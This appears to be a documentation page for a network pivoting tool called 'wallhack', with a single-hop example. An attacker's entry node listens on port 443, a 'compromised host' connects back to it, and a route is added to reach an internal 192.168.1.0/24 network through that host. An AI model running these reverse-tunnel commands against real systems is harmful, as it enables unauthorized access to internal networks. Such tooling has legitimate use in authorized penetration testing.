# Single Hop Example

Establish a direct tunnel between an entry node and a single compromised host. In this scenario, the host (`10.0.1.5`) connects back to your machine (`10.0.0.5`). Once the tunnel is established, traffic is routed to the networks accessible through that host — in this example, `192.168.1.0/24`.

{% steps %}
{% step title="Attacker" number=1 %}
An [entry node](/concepts) listening for incoming connections.

{% codeblock code="wallhack entry --listen :443" /%}
{% /step %}

{% step title="Compromised Host" number=2 %}
An [exit node](/concepts) connecting back to the attacker.

{% codeblock code="wallhack exit --connect 10.0.0.5:443" /%}
{% /step %}

{% step title="Configure Routes" number=3 %}
Add routes for the networks accessible through the compromised host.

```bash
ip route add 192.168.1.0/24 dev tun0
```
{% /step %}
{% /steps %}

{% trafficflow flow="10.0.0.5 (you) -> 10.0.1.5 (compromised) -> 192.168.1.0/24 (target)" label="Traffic Flow:" /%}
